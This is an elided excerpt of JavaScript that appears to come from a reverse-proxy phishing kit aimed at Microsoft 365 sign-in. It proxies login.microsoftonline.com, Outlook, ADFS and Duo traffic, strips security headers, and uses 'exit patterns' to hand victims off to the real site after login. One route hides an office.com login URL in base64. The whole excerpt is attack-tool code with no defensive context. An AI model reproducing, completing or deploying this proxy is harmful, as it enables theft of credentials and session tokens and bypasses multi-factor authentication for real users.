...
const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {
    ...
    constructor(proxyResp, browserEndPoint) {
        ...
        this.regexes = [
            {
                reg: /outlook.office.com/igm, // Google chrome on windows fix
    ...
    processResponse() {
        if (!this.browserEndPoint.headersSent) {
            ...
            this.browserEndPoint.removeHeader('Referer')
            this.browserEndPoint.removeHeader('Report-To')
            // this.browserEndPoint.removeHeader('P3p')
            // this.browserEndPoint.removeHeader('Nel')
            // this.browserEndPoint.removeHeader('Link')
            // this.browserEndPoint.removeHeader('X-Ms-Ests-Server')
            // this.browserEndPoint.removeHeader('X-Ms-Request-Id')
...
const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    ...
    execute(clientContext) {
        // BEGIN EXIt PATTERNS
        if (this.req.url === '/owa/' && clientContext.currentDomain === 'login.microsoftonline.com') {
            return super.exitLink(configExport.EXIT_URL, clientContext)
        }

        if (this.req.url.startsWith('/owa/?username=')) {
            this.res.writeHead(302, {location: 'https://login.live.com'})
            return this.res.end()
        ...
        if (this.req.url.startsWith(`/${process.env.RDR_SCRIPT}=aHR0cHM6Ly93d3cub2ZmaWNlLmNvbS9sb2dpbiM=`)) {
        ...
        if (redirectToken !== null) {
            ...
            if (redirectToken.url.startsWith('https://login.microsoftonline.com/common/oauth2/nativeclient')) {
                ...
                return super.exitLink('https://outlook.com', clientContext)
            }
            ...
            if (redirectHost === 'login.microsoftonline.com'
                ...
                || redirectHost.endsWith('duosecurity.com')
                ) {
            ...
            if (redirectToken.obj.pathname === '/adfs/ls/') {
                clientContext.currentDomain = redirectHost
            }

            return super.superExecuteProxy(redirectHost, clientContext)
